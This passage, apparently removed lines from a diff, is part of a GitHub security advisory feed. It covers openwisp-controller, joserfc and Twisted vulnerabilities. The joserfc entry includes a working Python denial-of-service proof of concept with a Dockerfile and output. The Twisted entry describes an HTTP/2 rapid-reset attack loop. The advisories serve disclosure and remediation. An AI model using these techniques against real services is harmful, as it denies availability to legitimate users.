-<li><a href="https://github.com/oauthlib/oauthlib/security/advisories/GHSA-7984-qgvg-3j9c">https://github.com/oauthlib/oauthlib/security/advisories/GHSA-7984-qgvg-3j9c</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-118669">https://nvd.nist.gov/vuln/detail/CVE-2026-118669</a></li>
-<li><a href="https://github.com/oauthlib/oauthlib/pull/920">https://github.com/oauthlib/oauthlib/pull/920</a></li>
-<li><a href="https://github.com/oauthlib/oauthlib/commit/c951a1d09f99f14e3240973fa83c4f4287d4753d">https://github.com/oauthlib/oauthlib/commit/c951a1d09f99f14e3240973fa83c4f4287d4753d</a></li>
-<li><a href="https://github.com/oauthlib/oauthlib/releases/tag/v4.0.0">https://github.com/oauthlib/oauthlib/releases/tag/v4.0.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-7984-qgvg-3j9c">https://github.com/advisories/GHSA-7984-qgvg-3j9c</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-7984-qgvg-3j9c</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-10-30T22:58:16.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[openwisp-controller] OpenWISP Controller CA CRL REST API does not scope requests to managed organizations]]></title>
-        <id>https://github.com/advisories/GHSA-9gh4-xw24-9xh5</id>
-        <link href="https://github.com/advisories/GHSA-9gh4-xw24-9xh5"/>
-        <updated>2026-10-30T22:58:13.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>The authenticated REST API endpoint for downloading a CA Certificate Revocation List resolves the requested CA without applying the organization-scoped queryset used by the rest of the PKI API.</p>
-<p>An organization manager with CA view permission can request another organization's sequential CA ID and receive that CA's CRL. The endpoint is intended to be authenticated and organization-scoped, so it should use the same access-control path as <code>GET /api/v1/controller/ca/&lt;id&gt;/</code>.</p>
-<h2 id="affected-endpoint">Affected endpoint</h2>
-<pre><code class="language-text">GET /api/v1/controller/ca/&lt;integer-id&gt;/crl
-</code></pre>
-<p><code>CrlDownloadView</code> inherits <code>ProtectedAPIMixin</code>, which requires an authenticated organization manager with the relevant model permission. However, <code>retrieve()</code> resolves the CA with <code>get_object_or_404(Ca, pk=kwargs["pk"])</code>. This bypasses <code>FilterByOrganizationManaged</code> and does not perform an object-level permission check.</p>
-<p>Consequently, a manager of organization A can enumerate CA integer IDs and retrieve the CRL for a CA belonging to organization B. The sibling CA detail endpoint is correctly organization-scoped and returns <code>404</code> for the same cross-organization request.</p>
-<h2 id="impact">Impact</h2>
-<p>The endpoint returns only the CRL, including CA issuer information and revoked certificate serial numbers. It does not disclose CA private keys and does not permit modification.</p>
-<p>django-x509 exposes CRLs publicly by default unless <code>DJANGO_X509_CRL_PROTECTED = True</code>. Therefore, the default configuration does not gain a new confidentiality exposure from this REST API behavior. Nonetheless, the endpoint is part of the authenticated, organization-scoped REST API and does not enforce its intended authorization boundary.</p>
-<p>Deployments that explicitly protect CRLs have a stronger expectation that this endpoint will scope access to the requester's managed organizations. The practical impact is low, but the authorization behavior should be corrected for consistency and defense in depth.</p>
-<h2 id="remediation">Remediation</h2>
-<p>Resolve the CA through the view's organization-scoped queryset. Set <code>queryset = Ca.objects.all()</code>, replace the direct <code>get_object_or_404(Ca, pk=kwargs["pk"])</code> lookup with <code>self.get_object()</code>, and add a regression test that a same-organization manager receives <code>200</code> while a manager of another organization receives <code>404</code>.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/openwisp/openwisp-controller/security/advisories/GHSA-9gh4-xw24-9xh5">https://github.com/openwisp/openwisp-controller/security/advisories/GHSA-9gh4-xw24-9xh5</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-116677">https://nvd.nist.gov/vuln/detail/CVE-2026-116677</a></li>
-<li><a href="https://github.com/openwisp/openwisp-controller/commit/90ded783267aa11b89768b0ec9ae69895cc3730c">https://github.com/openwisp/openwisp-controller/commit/90ded783267aa11b89768b0ec9ae69895cc3730c</a></li>
-<li><a href="https://github.com/openwisp/openwisp-controller/commit/9e1869e17734a0f34bc428622d463c1a8c230720">https://github.com/openwisp/openwisp-controller/commit/9e1869e17734a0f34bc428622d463c1a8c230720</a></li>
-<li><a href="https://github.com/openwisp/openwisp-controller/releases/tag/1.3.2">https://github.com/openwisp/openwisp-controller/releases/tag/1.3.2</a></li>
-<li><a href="https://github.com/advisories/GHSA-9gh4-xw24-9xh5">https://github.com/advisories/GHSA-9gh4-xw24-9xh5</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-9gh4-xw24-9xh5</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-10-30T22:58:10.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[joserfc] joserfc: Compact JWS size guard allocates attacker-controlled segments before rejection]]></title>
-        <id>https://github.com/advisories/GHSA-9pg5-8c7x-5hfx</id>
-        <link href="https://github.com/advisories/GHSA-9pg5-8c7x-5hfx"/>
-        <updated>2026-10-30T14:54:26.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>joserfc 1.7.4 defines compact-JWS header, payload, and signature limits, but
-calls <code>value.split(b".")</code> before validating them. Python <code>bytes.split()</code> copies
-the attacker-controlled segments, so the current guard allocates roughly one
-complete payload before rejecting it.</p>
-<h2 id="reproduction">Reproduction</h2>
-<pre><code class="language-bash">.venv-research/bin/python 06-practical-testing/preauth-memory-profile.py
-</code></pre>
-<p>The input is resident before a fork-isolated verifier runs, and every signature
-is invalid.</p>
-<table>
-<thead>
-<tr>
-<th align="right">Input</th>
-<th align="right">Peak RSS delta</th>
-<th align="right">Amplification</th>
-<th>Result</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="right">1 MiB</td>
-<td align="right">1.11 MiB</td>
-<td align="right">1.11×</td>
-<td>size rejected</td>
-</tr>
-<tr>
-<td align="right">4 MiB</td>
-<td align="right">4.04 MiB</td>
-<td align="right">1.01×</td>
-<td>size rejected</td>
-</tr>
-<tr>
-<td align="right">8 MiB</td>
-<td align="right">8.04 MiB</td>
-<td align="right">1.01×</td>
-<td>size rejected</td>
-</tr>
-<tr>
-<td align="right">16 MiB</td>
-<td align="right">16.04 MiB</td>
-<td align="right">1.00×</td>
-<td>size rejected</td>
-</tr>
-<tr>
-<td align="right">32 MiB</td>
-<td align="right">31.74 MiB</td>
-<td align="right">0.99×</td>
-<td>size rejected</td>
-</tr>
-<tr>
-<td align="right">64 MiB</td>
-<td align="right">63.80 MiB</td>
-<td align="right">1.00×</td>
-<td>size rejected</td>
-</tr>
-</tbody></table>
-<p>The unconstrained profile is the primary evidence: joserfc allocates an
-additional attacker-sized object before producing its intended
-<code>ExceededSizeError</code>. A separate baseline-plus-headroom stress test raises
-<code>MemoryError</code> when that copy cannot fit, but this report does not characterize
-an absolute <code>RLIMIT_AS</code> value as a realistic worker memory budget.</p>
-<h2 id="security-argument">Security Argument</h2>
-<p>The issue is not that joserfc can prevent the transport layer from receiving a
-large header. The issue is narrower: once bytes reach <code>deserialize_compact()</code>,
-the library's existing size guard cannot fulfill its allocation-limiting purpose
-because attacker-controlled segment copies are created first.</p>
-<p>This differs from
-<a href="https://github.com/authlib/joserfc/security/advisories/GHSA-frfh-8v73-gjg4">GHSA-frfh-8v73-gjg4</a>,
-which concerned embedding already-loaded oversized segments in exception and log
-messages. Here, the current implementation itself creates an additional
-payload-sized allocation before its fixed size exception.</p>
-<h2 id="recommended-fix">Recommended Fix</h2>
-<p>Check <code>len(value)</code> against a maximum compact-serialization size before
-<code>split()</code>. If per-segment diagnostics are needed, locate delimiters with bounded
-<code>find()</code> operations or memory views, validate offsets and lengths, and only then
-materialize acceptable segments.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/authlib/joserfc/security/advisories/GHSA-9pg5-8c7x-5hfx">https://github.com/authlib/joserfc/security/advisories/GHSA-9pg5-8c7x-5hfx</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-119284">https://nvd.nist.gov/vuln/detail/CVE-2026-119284</a></li>
-<li><a href="https://github.com/authlib/joserfc/commit/397e04f4bbce0b94d86e31c1c003f4640af8fb39">https://github.com/authlib/joserfc/commit/397e04f4bbce0b94d86e31c1c003f4640af8fb39</a></li>
-<li><a href="https://github.com/authlib/joserfc/releases/tag/1.7.6">https://github.com/authlib/joserfc/releases/tag/1.7.6</a></li>
-<li><a href="https://github.com/advisories/GHSA-9pg5-8c7x-5hfx">https://github.com/advisories/GHSA-9pg5-8c7x-5hfx</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-9pg5-8c7x-5hfx</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-10-30T14:54:25.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[joserfc] joserfc: Unbounded JWE General JSON `recipients` Array Leads to CPU Exhaustion (DoS) via Repeated RSA Private-Key Decryption]]></title>
-        <id>https://github.com/advisories/GHSA-jpxq-7h8p-2q76</id>
-        <link href="https://github.com/advisories/GHSA-jpxq-7h8p-2q76"/>
-        <updated>2026-10-30T14:54:20.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p><code>joserfc.jwe.decrypt_json()</code>, the library's public parser for JWE General JSON Serialization, accepts an attacker-controlled <code>recipients</code> array of unbounded length and performs one full private-key decryption operation (<code>decrypt_cek</code>) for <strong>every</strong> recipient present in the input, with no cap on recipient count. An unauthenticated network attacker who can send a JWE General JSON document to any endpoint that decrypts it with an RSA key (e.g. RSA-OAEP) can force the victim to perform an arbitrary, attacker-chosen number of RSA private-key decryption operations from a single, relatively small HTTP request. This gives the attacker a highly asymmetric CPU-exhaustion (Denial of Service) primitive: local reproduction shows request size growing linearly with recipient count (~396 bytes/recipient) while server-side CPU time grows in lock-step (near 1:1 ratio between recipient-count growth and decrypt-time growth), and the library's only documented mitigation knob, <code>verify_all_recipients=False</code>, does <strong>not</strong> reduce the CPU cost, since the decrypt loop attempts every recipient's <code>decrypt_cek()</code> unconditionally before that flag is ever consulted. This is CWE-400 (Uncontrolled Resource Consumption) with CVSS v3.1 Base Score 7.5 (High).</p>
-<h3 id="details">Details</h3>
-<p><code>joserfc</code> validates and caps several structural elements of a JWE (protected header size, encrypted key size, IV size, ciphertext size, and auth-tag size) inside <code>src/joserfc/_rfc7516/registry.py</code>, but performs <strong>no validation whatsoever on the number of entries in the <code>recipients</code> array</strong> of a JWE General JSON Serialization object.</p>
-<p>Data flow (source → sink), verified directly against the repository source at commit <code>26a10275e88276184f91ae2a6409647bfac7fea5</code> (joserfc 1.7.4):</p>
-<ol>
-<li><code>src/joserfc/jwe.py:214</code> — public parser entry point <code>decrypt_json(data, private_key, ...)</code>. This is a documented, unauthenticated (at the library boundary) API for parsing externally supplied JWE JSON.</li>
-<li><code>src/joserfc/jwe.py:238</code> — if <code>"recipients"</code> is present in the input dict, <code>extract_general_json(...)</code> is invoked.</li>
-<li><code>src/joserfc/_rfc7516/json.py:84-86</code> — iterates <code>for item in data["recipients"]:</code> and appends a <code>Recipient</code> object for every entry, with <strong>no upper bound check</strong> on <code>len(data["recipients"])</code>:<pre><code class="language-python">for item in data["recipients"]:
-    recipient = __extract_recipient(obj, item, registry)
-    obj.recipients.append(recipient)
-</code></pre>
-</li>
-<li><code>src/joserfc/jwe.py:252</code> — the private key is attached to every extracted recipient.</li>
-<li><code>src/joserfc/_rfc7516/message.py:103-112</code> — <code>_perform_decrypt()</code> loops over <strong>every</strong> recipient in <code>obj.recipients</code> and calls <code>decrypt_recipient(...)</code> for each one, regardless of how many there are:<pre><code class="language-python">cek_set = set()
-for recipient in obj.recipients:
-    headers = recipient.headers()
-    registry.check_header(headers, True)
-    alg = registry.get_alg(headers["alg"])
-    try:
-        cek = decrypt_recipient(alg, enc, recipient, tag)
-        cek_set.add(cek)
-</code></pre>
-</li>
-<li><code>src/joserfc/_rfc7518/jwe_algs.py:74-83</code> — for RSA-OAEP/RSA1_5 recipients, this dispatches to the sink, a genuine RSA private-key operation:<pre><code class="language-python">def decrypt_cek(self, recipient: Recipient[RSAKey]) -&gt; bytes:
-    key = recipient.recipient_key
-    assert key is not None
-    self.check_key_type(key)
-    op_key = key.get_op_key("decrypt")
-    try:
-        assert recipient.encrypted_key is not None
-        cek = op_key.decrypt(recipient.encrypted_key, self.padding)
-</code></pre>
-</li>
-</ol>
-<p>Confirmed by direct inspection of <code>src/joserfc/_rfc7516/registry.py</code>: size caps exist for <code>max_header_length</code>, <code>max_encrypted_key_length</code>, <code>max_iv_length</code>, <code>max_ciphertext_length</code>, and <code>max_auth_tag_length</code> (registry.py:52-62, 103-121), but no <code>max_recipients</code> (or equivalent) field or check exists anywhere in <code>registry.py</code>, <code>json.py</code>, or <code>jwe.py</code>.</p>
-<p>Critically, the loop in <code>message.py:103-112</code> calls <code>decrypt_recipient()</code> for <strong>every</strong> recipient unconditionally — this happens <em>before</em> <code>registry.verify_all_recipients</code> is ever consulted. Setting <code>verify_all_recipients=False</code> (the library's only documented related option) therefore changes whether a decrypt failure raises an exception, but does <strong>not</strong> reduce the number of RSA private-key operations performed, and thus does not mitigate the CPU cost. This was independently confirmed at runtime (see PoC results below): decrypt time is statistically identical between <code>verify_all_recipients=True</code> and <code>verify_all_recipients=False</code> for the same recipient count.</p>
-<p><code>decrypt_json()</code> is not a demo-only or admin-only code path: it is documented in <code>docs/guide/jwe.rst:156-182</code> as the standard way to parse and decrypt an externally received General JSON JWE, and requires no special/non-default configuration to trigger. This is functionally analogous to two other resource-exhaustion issues already fixed in the same codebase — the PBES2 <code>p2c</code> iteration cap (<code>src/joserfc/_rfc7518/jwe_algs.py:237-239</code>) and the JWE compression "zip bomb" size cap (<code>src/joserfc/_rfc7518/jwe_zips.py:11,26-28</code>) — indicating the recipient-count case was simply missed from the same class of hardening.</p>
-<h3 id="poc">PoC</h3>
-<p>Both static (Phase 1) and dynamic, containerized (Phase 2) reproduction confirmed the vulnerability against unmodified joserfc 1.7.4 source.</p>
-<p><strong>Environment setup (Dockerfile):</strong></p>
-<pre><code class="language-dockerfile">FROM python:3.12-slim
-WORKDIR /app
-# Copy the exact repository source under test (unmodified).
-COPY repo /app/repo
-# Install joserfc from local source in editable/normal mode.
-RUN pip install --no-cache-dir /app/repo
-# Copy the PoC script.
-COPY vuln-001/poc.py /app/poc.py
-ENTRYPOINT ["python3", "/app/poc.py"]
-</code></pre>
-<p>Build and run (source is used unmodified; container has no network access):</p>
-<pre><code class="language-bash">docker build -t joserfc-vuln001 -f vuln-001/Dockerfile .
-docker run --rm --network none joserfc-vuln001 --recipients 1 500 1500
-</code></pre>
-<p><strong>PoC logic (<code>poc.py</code>):</strong> generates a victim RSA-2048 keypair (representing the RSA key an application would use for RSA-OAEP JWE decryption), crafts a General JSON JWE (<code>GeneralJSONEncryption</code>) wrapping a small plaintext with an attacker-chosen number <code>n</code> of RSA-OAEP recipients (all using the victim's public key, which is inherently public for JWE encryption), then calls the unmodified public API <code>joserfc.jwe.decrypt_json()</code> and measures wall-clock decrypt time, once with <code>verify_all_recipients=True</code> and once with <code>verify_all_recipients=False</code>.</p>
-<pre><code class="language-python">def build_token(public_key, n_recipients: int) -&gt; tuple[str, int]:
-    obj = GeneralJSONEncryption({"enc": "A128GCM"}, b"hello")
-    for _ in range(n_recipients):
-        obj.add_recipient({"alg": "RSA-OAEP"}, public_key)
-    token = jwe.encrypt_json(obj, None)
-    size_bytes = len(json.dumps(token).encode())
-    return token, size_bytes
-
-def measure_decrypt(token, private_key, verify_all_recipients: bool) -&gt; float:
-    registry = JWERegistry(verify_all_recipients=verify_all_recipients)
-    t0 = time.perf_counter()
-    out = jwe.decrypt_json(token, private_key, registry=registry)
-    dt = time.perf_counter() - t0
-    assert out.plaintext == b"hello"
-    return dt
-</code></pre>
-<p><strong>Observed results (Phase 2, inside the Docker container, <code>--network none</code>, unmodified source):</strong></p>
-<pre><code>[*] Attacker crafts General JSON JWE with recipients=1 ...
-    verify_all_recipients=True  -&gt; decrypt_json() succeeded, size_bytes=536 decrypt_seconds=0.002
-    verify_all_recipients=False -&gt; decrypt_json() succeeded, size_bytes=536 decrypt_seconds=0.001
-[*] Attacker crafts General JSON JWE with recipients=500 ...
-    verify_all_recipients=True  -&gt; decrypt_json() succeeded, size_bytes=198140 decrypt_seconds=0.631
-    verify_all_recipients=False -&gt; decrypt_json() succeeded, size_bytes=198140 decrypt_seconds=0.651
-[*] Attacker crafts General JSON JWE with recipients=1500 ...
-    verify_all_recipients=True  -&gt; decrypt_json() succeeded, size_bytes=594140 decrypt_seconds=1.874
-    verify_all_recipients=False -&gt; decrypt_json() succeeded, size_bytes=594140 decrypt_seconds=1.875
-[CHECK] recipient_count_ratio=1500.0x decrypt_time_ratio=937.0x
-[PASS] decrypt_json() performed one RSA private-key decrypt per attacker-supplied recipient with
-       no upper bound, and verify_all_recipients=False did not mitigate the cost.
-</code></pre>
-<p>Independent static-phase (Phase 1) reproduction against the same commit, outside the container, produced the same linear-scaling behavior (recipients=500 → 198,140 bytes → 0.627s; recipients=1500 → 594,140 bytes → 1.957s), and the original report's own local run showed recipients=1000 → 396,140 bytes → 1.254s; recipients=3000 → 1,188,140 bytes → 3.762s. In every run, <code>plaintext=b'hello'</code> was correctly recovered, confirming each crafted request is fully valid input, not malformed data rejected early.</p>
-<p>In all cases, <code>verify_all_recipients=False</code> produced decrypt times statistically identical to <code>verify_all_recipients=True</code> for the same recipient count (e.g. 500 recipients: 0.631s vs 0.651s; 1500 recipients: 1.874s vs 1.875s), empirically confirming that this documented flag does not mitigate the CPU cost.</p>
-<h3 id="impact">Impact</h3>
-<p>This is a remote, unauthenticated CPU-exhaustion Denial-of-Service vulnerability (CWE-400, Uncontrolled Resource Consumption). Any application that:</p>
-<ul>
-<li>exposes an endpoint (or message-processing path) that accepts JWE data in General JSON Serialization form, and</li>
-<li>decrypts it using <code>joserfc.jwe.decrypt_json()</code> with an RSA-based key-management algorithm (e.g. RSA-OAEP, RSA1_5)</li>
-</ul>
-<p>is impacted. The attacker needs only the victim's RSA public key — which is inherently public, since it is used by legitimate senders to encrypt JWEs to the victim. Because request size scales linearly with recipient count (~396 bytes per recipient) while attacker-inflicted server CPU cost scales in lock-step with recipient count, the attacker gets a highly favorable cost asymmetry: e.g. a ~1.2 MB request forced ~3.8 seconds of RSA-2048 private-key decrypt operations in testing. Repeated or concurrent requests of this shape can exhaust available CPU/worker capacity on the victim service, degrading or denying availability for legitimate users. Confidentiality and integrity are not affected (no key material or plaintext is disclosed or corrupted); the impact is availability only, matching the CVSS vector's <code>C:N/I:N/A:H</code>.</p>
-<h3 id="reproduction-artifacts">Reproduction artifacts</h3>
-<h4 id="dockerfile"><code>Dockerfile</code></h4>
-<pre><code class="language-dockerfile"># VULN-001 dynamic reproduction environment
-# Unbounded JWE General JSON "recipients" array causes CPU exhaustion via
-# repeated RSA private-key decryption in joserfc's decrypt_json().
-#
-# This image builds joserfc from the local repository clone (unmodified
-# source) and provides a Python environment to run poc.py against it.
-
-FROM python:3.12-slim
-
-WORKDIR /app
-
-# Copy the exact repository source under test (unmodified).
-COPY repo /app/repo
-
-# Install joserfc from local source in editable/normal mode.
-RUN pip install --no-cache-dir /app/repo
-
-# Copy the PoC script.
-COPY vuln-001/poc.py /app/poc.py
-
-ENTRYPOINT ["python3", "/app/poc.py"]
-</code></pre>
-<h4 id="pocpy"><code>poc.py</code></h4>
-<pre><code class="language-python">"""
-VULN-001 dynamic PoC: Unbounded JWE General JSON "recipients" array causes
-CPU exhaustion (CWE-400) via repeated RSA private-key decryption inside
-joserfc's public parser API `joserfc.jwe.decrypt_json()`.
-
-Data flow reproduced end to end (unmodified joserfc source):
-  1. joserfc.jwe.decrypt_json()                         (src/joserfc/jwe.py:214)
-  2. -&gt; extract_general_json()                           (src/joserfc/_rfc7516/json.py:73)
-  3. -&gt; for item in data["recipients"]: (NO COUNT CAP)   (src/joserfc/_rfc7516/json.py:84)
-  4. -&gt; perform_decrypt() -&gt; _perform_decrypt()          (src/joserfc/_rfc7516/message.py:93-112)
-  5. -&gt; for recipient in obj.recipients: decrypt_recipient(...) for EVERY recipient,
-        regardless of registry.verify_all_recipients
-  6. -&gt; RSAAlgModel.decrypt_cek(): op_key.decrypt(...)   (src/joserfc/_rfc7518/jwe_algs.py:74-83)
-     performs one real RSA-2048 private-key decrypt operation per recipient.
-
-This script:
-  (a) builds a victim RSA keypair (2048-bit, as an application would use for
-      RSA-OAEP JWE decryption),
-  (b) crafts a General JSON JWE token with an attacker-chosen number of
-      RSA-OAEP recipients, all wrapping the SAME small ciphertext,
-  (c) measures wall-clock CPU time joserfc's unmodified decrypt_json() spends
-      processing the token as the recipient count grows,
-  (d) shows that setting verify_all_recipients=False (the only public
-      mitigation knob mentioned in the docs) does NOT reduce the CPU cost,
-      because the decrypt loop in message.py always attempts every
-      recipient's decrypt_cek() before that flag is ever consulted.
-
-Deterministic PASS criteria (printed as machine-readable JSON lines):
-  - decrypt_json() succeeds (returns correct plaintext) for all recipient counts.
-  - decrypt_seconds scales roughly linearly with recipient count (attacker
-    control over victim CPU cost, unbounded by the library).
-  - decrypt_seconds for verify_all_recipients=False is statistically the same
-    order of magnitude as verify_all_recipients=True for the same recipient
-    count (proving the documented mitigation does not help).
-"""
-
-import argparse
-import json
-import time
-
-from joserfc import jwe, jwk
-from joserfc.jwe import GeneralJSONEncryption
-from joserfc.jwe import JWERegistry
-
-
-def build_token(public_key, n_recipients: int) -&gt; tuple[str, int]:
-    """Craft a General JSON JWE with n_recipients RSA-OAEP recipients,
-    all wrapping the same small plaintext. This is exactly the shape an
-    unauthenticated network attacker can send to any endpoint that calls
-    jwe.decrypt_json() on external input, as documented in
-    docs/guide/jwe.rst."""
-    obj = GeneralJSONEncryption({"enc": "A128GCM"}, b"hello")
-    for _ in range(n_recipients):
-        obj.add_recipient({"alg": "RSA-OAEP"}, public_key)
-    token = jwe.encrypt_json(obj, None)
-    size_bytes = len(json.dumps(token).encode())
-    return token, size_bytes
-
-
-def measure_decrypt(token, private_key, verify_all_recipients: bool) -&gt; float:
-    registry = JWERegistry(verify_all_recipients=verify_all_recipients)
-    t0 = time.perf_counter()
-    out = jwe.decrypt_json(token, private_key, registry=registry)
-    dt = time.perf_counter() - t0
-    assert out.plaintext == b"hello", f"unexpected plaintext: {out.plaintext!r}"
-    return dt
-
-
-def main():
-    parser = argparse.ArgumentParser(description="VULN-001 dynamic reproduction PoC")
-    parser.add_argument(
-        "--recipients",
-        type=int,
-        nargs="+",
-        default=[1, 500, 1500],
-        help="Recipient counts to test (attacker-controlled array length).",
-    )
-    parser.add_argument(
-        "--key-bits",
-        type=int,
-        default=2048,
-        help="RSA key size of the victim's decryption key.",
-    )
-    args = parser.parse_args()
-
-    print(f"[*] Generating victim RSA-{args.key_bits} keypair (RSA-OAEP JWE key)...")
-    private_key = jwk.RSAKey.generate_key(args.key_bits)
-    public_key = jwk.RSAKey.import_key(private_key.as_dict(private=False))
-    print("[*] Victim private key generated locally; public key is what an attacker would normally have.")
-
-    results = []
-    for n in args.recipients:
-        print(f"\n[*] Attacker crafts General JSON JWE with recipients={n} ...")
-        token, size_bytes = build_token(public_key, n)
-
-        dt_verify_true = measure_decrypt(token, private_key, verify_all_recipients=True)
-        print(
-            f"    verify_all_recipients=True  -&gt; decrypt_json() succeeded, "
-            f"size_bytes={size_bytes} decrypt_seconds={dt_verify_true:.3f}"
-        )
-
-        dt_verify_false = measure_decrypt(token, private_key, verify_all_recipients=False)
-        print(
-            f"    verify_all_recipients=False -&gt; decrypt_json() succeeded, "
-            f"size_bytes={size_bytes} decrypt_seconds={dt_verify_false:.3f} "
-            f"(documented 'mitigation' does NOT reduce CPU cost)"
-        )
-
-        results.append(
-            {
-                "recipients": n,
-                "size_bytes": size_bytes,
-                "decrypt_seconds_verify_all_true": round(dt_verify_true, 3),
-                "decrypt_seconds_verify_all_false": round(dt_verify_false, 3),
-            }
-        )
-
-    print("\n[RESULT_JSON] " + json.dumps(results))
-
-    # Deterministic scaling check: CPU time for the largest recipient count
-    # must be substantially larger (order of magnitude, not noise) than for
-    # the smallest, proving attacker control over victim CPU consumption.
-    baseline = results[0]["decrypt_seconds_verify_all_true"]
-    worst = results[-1]["decrypt_seconds_verify_all_true"]
-    ratio = worst / baseline if baseline &gt; 0 else float("inf")
-    recipient_ratio = results[-1]["recipients"] / results[0]["recipients"]
-    print(
-        f"[CHECK] recipient_count_ratio={recipient_ratio:.1f}x "
-        f"decrypt_time_ratio={ratio:.1f}x "
-        f"(unbounded recipients =&gt; unbounded RSA-decrypt CPU cost, no cap in registry.py)"
-    )
-
-    if ratio &lt; recipient_ratio * 0.3:
-        print("[FAIL] Decrypt time did not scale with recipient count as expected.")
-        raise SystemExit(1)
-
-    print("[PASS] decrypt_json() performed one RSA private-key decrypt per attacker-supplied "
-          "recipient with no upper bound, and verify_all_recipients=False did not mitigate the cost.")
-
-
-if __name__ == "__main__":
-    main()
-</code></pre>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/authlib/joserfc/security/advisories/GHSA-jpxq-7h8p-2q76">https://github.com/authlib/joserfc/security/advisories/GHSA-jpxq-7h8p-2q76</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-119283">https://nvd.nist.gov/vuln/detail/CVE-2026-119283</a></li>
-<li><a href="https://github.com/authlib/joserfc/commit/d6dc8df6c7609277e741069d3733e43996c1cd17">https://github.com/authlib/joserfc/commit/d6dc8df6c7609277e741069d3733e43996c1cd17</a></li>
-<li><a href="https://github.com/authlib/joserfc/releases/tag/1.7.5">https://github.com/authlib/joserfc/releases/tag/1.7.5</a></li>
-<li><a href="https://github.com/advisories/GHSA-jpxq-7h8p-2q76">https://github.com/advisories/GHSA-jpxq-7h8p-2q76</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-jpxq-7h8p-2q76</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-10-30T14:54:20.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[Twisted] Twisted: Unauthenticated Remote Denial of Service in the Twisted HTTP/2 Server via Rapid Stream Reset]]></title>
-        <id>https://github.com/advisories/GHSA-vpp8-g58w-m8mp</id>
-        <link href="https://github.com/advisories/GHSA-vpp8-g58w-m8mp"/>
-        <updated>2026-10-29T16:41:06.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>An uncontrolled-resource-consumption vulnerability (CWE-400) in the Twisted HTTP/2 server lets any unauthenticated remote client exhaust server CPU over a single connection. A client that sends a request header block with <code>END_STREAM</code> and then immediately resets the stream makes the server route and render the request before it processes the reset. Reset streams are freed and never count against the concurrent-stream limit, and no reset-rate limiter exists, so the pattern can be repeated at line rate on one connection. This is the HTTP/2 Rapid Reset class, CVE-2023-44487.</p>
-<h2 id="details">Details</h2>
-<p>For one received segment the h2 events are processed in order in <code>H2Connection.dataReceived</code>. A <code>HEADERS(END_STREAM)</code> followed by <code>RST_STREAM</code> yields <code>RequestReceived</code>, <code>StreamEnded</code>, then <code>StreamReset</code>, so the request is dispatched and rendered on stream end before the reset is handled:</p>
-<pre><code class="language-python"># src/twisted/web/_http2.py  (H2Connection.dataReceived)
-for event in events:
-    if isinstance(event, h2.events.RequestReceived):
-        self._requestReceived(event)     # allocate the request
-    elif isinstance(event, h2.events.StreamEnded):
-        self._requestEnded(event)        # -&gt; requestComplete -&gt; render() synchronously
-    elif isinstance(event, h2.events.StreamReset):
-        self._requestAborted(event)      # processed last, frees the stream
-</code></pre>
-<p><code>_requestAborted</code> frees the reset stream, so it never occupies the 100-stream concurrency budget, and nothing in <code>_http2.py</code> counts or throttles opened-and-reset streams. The 2019 flood fix (GHSA-32gv) bounds outbound control-frame buffering only and does not apply to this path.</p>
-<p>Affected product: Twisted, <code>twisted.web</code> HTTP/2 server
-Affected versions: confirmed against 26.4.0</p>
-<h2 id="poc">PoC</h2>
-<p>On any Twisted HTTP/2 endpoint, open one connection and, in a tight loop, send a <code>HEADERS</code> frame with <code>END_STREAM</code> on a fresh stream identifier immediately followed by a <code>RST_STREAM</code> for that stream, at line rate. No credentials are required. The server renders each request on stream end before the reset frees the stream, and a freed stream never counts toward the concurrent-stream limit, so the loop is never throttled.</p>
-<p>Because every cancelled stream is still dispatched in full and reset streams do not accumulate, the connection is never throttled or closed, so the forced work grows with the number of pairs sent. Sustained on one connection this saturates a CPU core under only a trickle of traffic, whereas a client that instead leaves its streams open is closed once it reaches the concurrent-stream limit.</p>
-<h2 id="impact">Impact</h2>
-<p>This is an unauthenticated remote denial of service (CWE-400, CWE-770) by CPU exhaustion. One connection forces unbounded request rendering at a few frames per cancelled request, bypassing the concurrent-stream limit. It is the HTTP/2 Rapid Reset class (CVE-2023-44487), not covered by the earlier Twisted flood fix, with no confidentiality or integrity impact and no code execution.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/twisted/twisted/security/advisories/GHSA-vpp8-g58w-m8mp">https://github.com/twisted/twisted/security/advisories/GHSA-vpp8-g58w-m8mp</a></li>
-<li><a href="https://github.com/twisted/twisted/pull/12749">https://github.com/twisted/twisted/pull/12749</a></li>
